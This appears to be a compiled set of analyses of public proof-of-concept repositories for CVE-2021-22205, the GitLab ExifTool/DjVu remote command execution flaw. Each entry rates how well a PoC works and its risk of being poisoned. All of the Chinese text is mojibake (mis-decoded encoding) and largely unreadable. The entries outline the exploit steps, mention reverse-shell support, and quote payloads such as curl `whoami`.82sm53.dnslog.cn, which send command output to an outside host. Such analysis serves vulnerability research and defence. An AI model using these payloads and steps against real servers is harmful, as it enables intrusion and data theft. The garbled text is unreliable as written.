# CVE-2021-22205

> ðŸ“¦ è¯¥CVEæœ‰ **24** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2021-22205-Al1ex_CVE-2021-22205.md](../2021/CVE-2021-22205-Al1ex_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œä¸”ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab å¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ 11.9 åˆ° 13.8.8ï¼Œ13.9 åˆ° 13.9.6 ä»¥åŠ 13.10 åˆ° 13.10.3ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’ŒPOCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç é€šè¿‡æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åµŒå…¥äº†å‘½ä»¤ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾åƒæ—¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚POCä»£ç èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

å¯¹POCä»£ç çš„æŠ•æ¯’é£Žé™©åˆ†æžå¦‚ä¸‹ï¼š

*   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žï¼Œç»“æž„æ¸…æ™°ï¼Œç›®çš„æ˜¯æž„é€ æ¶æ„å›¾ç‰‡å¹¶å‘é€è¯·æ±‚ã€‚
*   è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£Žé™©ï¼Œä½†è¿™å±žäºŽæ¼æ´žæœ¬èº«çš„ç‰¹æ€§ï¼Œè€Œéžä½œè€…é¢å¤–æ·»åŠ çš„æ¶æ„ä»£ç ã€‚
*   å…¶ä¸­`curl `whoami`.82sm53.dnslog.cn`åªæ˜¯ä¸€ä¸ªDNSLogæ£€æµ‹ï¼Œç”¨äºŽéªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œå¹¶éžæ¶æ„æŠ•æ¯’ã€‚

è™½ç„¶æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´žæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä½†å°±æä¾›çš„POCä»£ç æœ¬èº«è€Œè¨€ï¼Œä¸å­˜åœ¨æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œå¤§çº¦ä¸º5%ã€‚ä¸»è¦é£Žé™©åœ¨äºŽä½¿ç”¨è¯¥POCè¿›è¡ŒæœªæŽˆæƒçš„æ¸—é€æµ‹è¯•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ï¼ˆ/users/sign_inï¼‰ï¼ŒèŽ·å–CSRF Tokenã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ExifToolå¤„ç†è¯¥å›¾åƒæ—¶æ‰§è¡Œã€‚`attack` å‡½æ•°ä¸­çš„ä»£ç å…è®¸é€šè¿‡ `-c` å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…é€šè¿‡/uploads/useræŽ¥å£ä¸Šä¼ æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚åŒæ—¶åœ¨POSTè¯·æ±‚ä¸­å¸¦ä¸ŠCSRF Tokenã€‚
4.  å½“GitLabå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šè§£æžè¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚
5.  æ”»å‡»è€…é€šè¿‡DNSLogæˆ–å…¶ä»–æ–¹å¼æ¥æŽ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„ç»“æžœï¼Œæˆ–è€…ç›´æŽ¥åˆ©ç”¨æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #2

**æ¥æº**: [CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md](../2021/CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨ä¸”å¯ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE 11.9 åˆ° 13.10.3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå½“ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLab Workhorse ä¼šå°† jpg|jpeg|tiff æ‰©å±•åçš„æ–‡ä»¶ä¼ é€’ç»™ ExifTool ä»¥åˆ é™¤ä»»ä½•éžç™½åå•çš„æ ‡ç­¾ã€‚ ExifTool å°†å¿½ç•¥æ–‡ä»¶æ‰©å±•åå¹¶å°è¯•æ ¹æ®å†…å®¹ç¡®å®šæ–‡ä»¶ç±»åž‹ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶æ¥è§¦å‘ DjVu è§£æžå™¨ã€‚ DjVu è§£æžå™¨åœ¨è§£æž DjVu æ³¨é‡Šæ—¶ï¼Œä¼šå¯¹ token è¿›è¡Œ eval æ“ä½œä»¥è½¬æ¢ C è½¬ä¹‰åºåˆ—ã€‚è™½ç„¶å­˜åœ¨ä¸€äº›éªŒè¯æ¥ç¡®ä¿æ‰€æœ‰å†…å®¹éƒ½è¢«æ­£ç¡®è½¬ä¹‰ï¼Œä½†æ˜¯åæ–œæ åŽè·Ÿæ¢è¡Œç¬¦å¯ä»¥è¢«æ­£ç¡®å¤„ç†ï¼Œä»Žè€Œå…è®¸å¼•å·è¢«å…³é—­ï¼Œå¹¶æ’å…¥å’Œè¯„ä¼°ä»»æ„ Perl ä»£ç ã€‚

æä¾›çš„ POC ä»£ç  (CVE-2021-22205.nse) æ˜¯ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå®ƒä¸ç›´æŽ¥åˆ©ç”¨è¯¥æ¼æ´žæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯é€šè¿‡æ£€æŸ¥ç‰¹å®š CSS æ–‡ä»¶çš„å­˜åœ¨æ¥åˆ¤æ–­ç›®æ ‡ GitLab å®žä¾‹æ˜¯å¦ä¸ºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ã€‚ å®ƒé€šè¿‡å‘é€ HTTP GET è¯·æ±‚åˆ° GitLab å®žä¾‹ï¼Œæ ¹æ®è¿”å›žçš„ CSS æ–‡ä»¶å†…å®¹æ¥ç¡®å®šGitLabçš„ç‰ˆæœ¬,å¦‚æžœç‰ˆæœ¬åœ¨å—å½±å“çš„èŒƒå›´å†…,åˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´žã€‚

åˆ©ç”¨æ–¹å¼ï¼š
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DjVu æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Perl ä»£ç ã€‚
2.  å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ï¼ˆé€šå¸¸ä½œä¸ºå¤´åƒã€é¡¹ç›®logoæˆ–å…¶ä»–å…è®¸ä¸Šä¼ å›¾åƒçš„å­—æ®µï¼‰ã€‚
3.  GitLab Workhorse å°†æ–‡ä»¶ä¼ é€’ç»™ ExifTool è¿›è¡Œå¤„ç†ã€‚
4.  ExifTool è¯†åˆ«å‡º DjVu æ ¼å¼å¹¶è°ƒç”¨ç›¸åº”çš„è§£æžå™¨ã€‚
5.  æ¶æ„ Perl ä»£ç è¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æŠ•æ¯’é£Žé™©è¯„ä¼°ï¼š
è¯¥ Nmap è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¯¥æ¼æ´žã€‚ ä»£ç ä¸­æ²¡æœ‰å‘çŽ°ä»»ä½•å°è¯•æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å‘ç›®æ ‡ç³»ç»Ÿæ¤å…¥åŽé—¨çš„è¿¹è±¡ã€‚ å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Ž (0%)ã€‚


**é¡¹ç›®åœ°å€:** [DIVD-NL/GitLab-cve-2021-22205-nse](https://github.com/DIVD-NL/GitLab-cve-2021-22205-nse)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #3

**æ¥æº**: [CVE-2021-22205-Hikikan_CVE-2021-22205.md](../2021/CVE-2021-22205-Hikikan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8ï¼›>=13.9, <13.9.6ï¼›>=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œå—å½±å“çš„GitLabå®žä¾‹æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æž„é€ çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨GitLabä½¿ç”¨çš„ExifToolå·¥å…·ä¸­çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§åˆ†æžï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ï¼Œè¯¥æ¼æ´žå½±å“GitLab 11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä¸”å±å®³ç­‰çº§ä¸ºCRITICALã€‚æä¾›çš„POCä»£ç `/tmp/2f45104b4dac4f2167b8fc87a9a77f9a/README.md` ä»…ä»…æ˜¯ä¸€ä¸ªè¯´æ˜Žæ–‡ä»¶ï¼Œæœ¬èº«ä¸å…·å¤‡æ¼æ´žåˆ©ç”¨èƒ½åŠ›ï¼Œåªæ˜¯è¯´æ˜Žäº†cveç¼–å·ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åˆ©ç”¨payloadï¼Œéœ€è¦é…åˆæœç´¢å¼•æ“ŽæŸ¥æ‰¾çœŸæ­£çš„åˆ©ç”¨ä»£ç ã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**
æä¾›çš„POCä»£ç æ–‡ä»¶å†…å®¹æžå…¶ç®€å•ï¼Œåªæœ‰CVEç¼–å·çš„æè¿°ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©æžä½Žã€‚å¯ä»¥è®¤ä¸ºæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†è¯¥å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šï¼Œä¾‹å¦‚é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLab ä½¿ç”¨ ExifTool è§£æžè¯¥å›¾åƒæ–‡ä»¶æ—¶ï¼Œæ¶æ„å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

æ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒæ–‡ä»¶ä¸­åµŒå…¥payloadï¼Œé€šå¸¸æ˜¯æž„é€ ä¸€ä¸ªç•¸å½¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ–‡ä»¶æ—¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚

**ä¼˜å…ˆçº§ï¼š**
æ ¹æ®æŽ’åºä¼˜å…ˆçº§ï¼Œæœç´¢å¼•æ“Žç»“æžœï¼ˆå½“å‰ä¸ºç©ºï¼‰> æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆç®€å•çš„READMEï¼‰> æ¼æ´žåº“ä¿¡æ¯ã€‚


**é¡¹ç›®åœ°å€:** [Hikikan/CVE-2021-22205](https://github.com/Hikikan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #4

**æ¥æº**: [CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md](../2021/CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼ŒæºäºŽå…¶æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æŽ¥å£ï¼ˆå¦‚ç”¨æˆ·å¤´åƒä¸Šä¼ ï¼‰è§¦å‘ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œä»Žè€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­çš„å‚è€ƒé“¾æŽ¥æŒ‡å‘äº† HackerOne æŠ¥å‘Šå’Œ Packet Storm Security çš„ç›¸å…³åˆ©ç”¨åˆ†æžï¼Œè¯æ˜Žäº†è¯¥æ¼æ´žçš„å¯åˆ©ç”¨æ€§ã€‚æä¾›çš„ bash è„šæœ¬èƒ½å¤Ÿè‡ªåŠ¨åŒ–åˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”¯æŒåå¼¹ shell å’Œè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©åˆ†æž:**
æä¾›çš„ bash è„šæœ¬ `cve-2021-22205.sh`  ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒï¼Œå¹¶é€šè¿‡ curl å‘½ä»¤ä¸Šä¼ åˆ°ç›®æ ‡ GitLab æœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ ä»£ç æœ¬èº«é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰æ˜Žæ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œå¦‚æœªç»æŽˆæƒçš„æ–‡ä»¶è®¿é—®ã€æ•°æ®çªƒå–ã€æˆ–è€…æ¤å…¥åŽé—¨ç­‰ã€‚

è™½ç„¶ç›®å‰çš„ä»£ç æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œä½†æ˜¯ç”±äºŽè„šæœ¬ä¼šæ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„å‘½ä»¤ï¼Œå› æ­¤å­˜åœ¨æ½œåœ¨é£Žé™©ã€‚ç”¨æˆ·éœ€è¦ä»”ç»†æ£€æŸ¥è¿è¡Œçš„å‘½ä»¤ï¼Œé¿å…æ‰§è¡Œæ¶æ„æ“ä½œã€‚æ½œåœ¨çš„æŠ•æ¯’æ–¹å¼å¯èƒ½æ˜¯åœ¨è„šæœ¬ä¸­æ·»åŠ éšè”½çš„é€»è¾‘ï¼Œä¾‹å¦‚æ ¹æ®ç›®æ ‡çŽ¯å¢ƒæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚å› æ­¤ï¼Œä»£ç çš„å®‰å…¨æ€§è¯„ä¼°å¹¶éžç»å¯¹ï¼Œéœ€è¦ç»“åˆå…·ä½“ä½¿ç”¨åœºæ™¯è¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚ ä»£ç ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶, å¹¶ä¸”è¿›è¡Œåˆ é™¤å¯ä»¥åˆ¤å®š,ä½œè€…çš„ç¼–ç ä¹ æƒ¯è‰¯å¥½.

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Token å’Œ Session Cookieã€‚
2.  ç„¶åŽï¼Œæž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥å…ƒæ•°æ®ä¸­åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  ä½¿ç”¨ curl å‘½ä»¤ï¼Œå°†æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨çš„å¤´åƒä¸Šä¼ æŽ¥å£ã€‚
4.  GitLab è°ƒç”¨ ExifTool å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifTool åœ¨è§£æžå›¾åƒå…ƒæ•°æ®æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
5. æ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹ shell æˆ–è€…æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤æ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [NukingDragons/gitlab-cve-2021-22205](https://github.com/NukingDragons/gitlab-cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #5

**æ¥æº**: [CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md](../2021/CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶GitLabæœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œåªéœ€ç½‘ç»œè®¿é—®å³å¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU æ–‡ä»¶ï¼‰ï¼Œå½“ GitLab å°è¯•å¤„ç†è¯¥æ–‡ä»¶æ—¶ï¼ŒExifTool ä¼šæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒå®žçŽ°äº†æ¼æ´žåˆ©ç”¨æ‰€éœ€çš„æ­¥éª¤ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚ å…ƒæ•°æ®ä¸­åµŒå…¥äº†æ‰§è¡Œå‘½ä»¤çš„ payloadã€‚ å…·ä½“çš„payloadåœ¨ `rce_payload` å‡½æ•°ä¸­æž„é€ , ä½¿ç”¨äº† `qx{}` åŒ…è£¹å‘½ä»¤ã€‚
2.  åˆ›å»ºé¡¹ç›®ï¼ŒèŽ·å–`csrf_token`ï¼Œå’Œ`_gitlab_session`ã€‚
3.  ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ°æ–°é¡¹ç›®çš„snippetï¼Œè§¦å‘æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œå¤§çº¦ä¸º10%ã€‚è™½ç„¶ä¸»è¦ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´žï¼Œä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **dnslog.cn:** ä»£ç ä¸­ä½¿ç”¨ `whoami`.q3ddlk.dnslog.cn åŸŸåè¿›è¡Œå‘½ä»¤æ‰§è¡Œç»“æžœçš„å›žä¼ ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åŸŸåæ¥æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ï¼Œä»Žè€Œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚è™½ç„¶åœ¨æµ‹è¯•ä¸­è¿™æ–¹ä¾¿äº†æ¼æ´žéªŒè¯ï¼Œä½†åœ¨å®žé™…æ”»å‡»ä¸­ï¼Œæ¶æ„åŸŸåå¯èƒ½è¢«ç”¨äºŽæ›´éšè”½çš„ç›®çš„ï¼Œå¦‚C2é€šä¿¡ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š

1.  **æ¼æ´žå‘çŽ°ï¼š** GitLab æœªæ­£ç¡®éªŒè¯ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´ ExifTool åœ¨å¤„ç†å›¾åƒæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
2.  **Payload æž„é€ ï¼š** æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å…ƒæ•°æ®åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **æ–‡ä»¶ä¸Šä¼ ï¼š** æ”»å‡»è€…ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ° GitLabï¼Œé€šå¸¸æ˜¯é€šè¿‡é¡¹ç›®åˆ›å»ºï¼Œæˆ–è€…ä¸Šä¼ åˆ° Issue æˆ– Merge Request ä¸­ã€‚
4.  **å‘½ä»¤æ‰§è¡Œï¼š** å½“ GitLab å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifTool æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚åˆ©ç”¨ä»£ç åˆ›å»ºé¡¹ç›®ï¼Œå¹¶èŽ·å–åˆ›å»ºsnippetçš„tokenï¼Œæœ€åŽä¸Šä¼ æ–‡ä»¶è§¦å‘ã€‚
